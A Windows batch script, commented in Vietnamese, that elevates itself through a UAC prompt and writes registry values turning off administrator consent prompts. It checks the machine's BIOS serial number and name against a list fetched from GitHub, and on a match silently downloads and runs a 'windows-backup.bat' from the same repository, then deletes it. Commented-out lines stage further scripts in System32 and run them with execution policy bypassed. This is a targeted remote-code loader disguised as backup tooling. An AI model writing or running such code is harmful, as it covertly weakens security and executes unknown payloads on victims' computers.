@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f

:: Tải file check.txt về %temp%
set "url=https://raw.githubusercontent.com/mitutina/mitutina/main/check.txt"
set "tempfile=%temp%\check.txt"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"
:: Kiểm tra xem file đã được tải xuống thành công chưa
if not exist "%tempfile%" (
    echo Khong tai dc file.txt.
    goto :cleanup
)
:: Lấy SerialNumber và Device Name
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_BIOS).SerialNumber"') do set "serial=%%i"
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set "device=%%i"

:: Hiển thị thông tin để so sánh
echo Serial Number: %serial%
echo Device Name: %device%
echo Noi Dung file check.txt:
type "%tempfile%"
:: So sánh nội dung
set "found=0"
for /f "tokens=*" %%j in ('type "%tempfile%"') do (
    if /i "%%j"=="%serial%" set "found=1"
    if /i "%%j"=="%device%" set "found=1"
)
:: Thực hiện hành động dựa trên kết quả so sánh
if %found%==1 (
    echo Trung Khop

rem powershell curl -o C:\Capture.png https://i.ibb.co/NS2jTRW/Capture.png

start /min powershell -Command "$url1 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat'; $tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup.bat'); Invoke-WebRequest -Uri $url1 -OutFile $tempPath1; Start-Process $tempPath1 -Wait; Remove-Item $tempPath1"
rem start /min powershell -Command "$url2 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat'; $tempPath2 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup2.bat'); Invoke-WebRequest -Uri $url2 -OutFile $tempPath2; Start-Process $tempPath2 -Wait; Remove-Item $tempPath2"
rem start /min powershell -Command "$url3 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup3.bat'; $tempPath3 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup3.bat'); Invoke-WebRequest -Uri $url3 -OutFile $tempPath3; Start-Process $tempPath3 -Wait; Remove-Item $tempPath3"
rem start /min powershell -Command "$url4 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup4.bat'; $tempPath4 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup4.bat'); Invoke-WebRequest -Uri $url4 -OutFile $tempPath4; Start-Process $tempPath4 -Wait; Remove-Item $tempPath4"
rem start /min powershell -Command "$url5 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup5.bat'; $tempPath5 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup5.bat'); Invoke-WebRequest -Uri $url5 -OutFile $tempPath5; Start-Process $tempPath5 -Wait; Remove-Item $tempPath5"
rem powershell curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1
rem powershell -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\windows-backup.ps1"

rem powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1; powershell -ExecutionPolicy Bypass -File 'C:\Windows\System32\WindowsPowerShell\windows-backup.ps1'"

rem del /f /q "C:\Capture.png"



    echo Thuc Hien Cac Lenh Khac...
) else (
    echo Khong Trung Khop.
)
:: Dọn dẹp các file tạm và biến
:cleanup
if exist "%tempfile%" del "%tempfile%"
set "url="
set "tempfile="
set "serial="
set "device="
set "found="
del /f /q "%temp%\check.txt"
echo Hoan Thanh

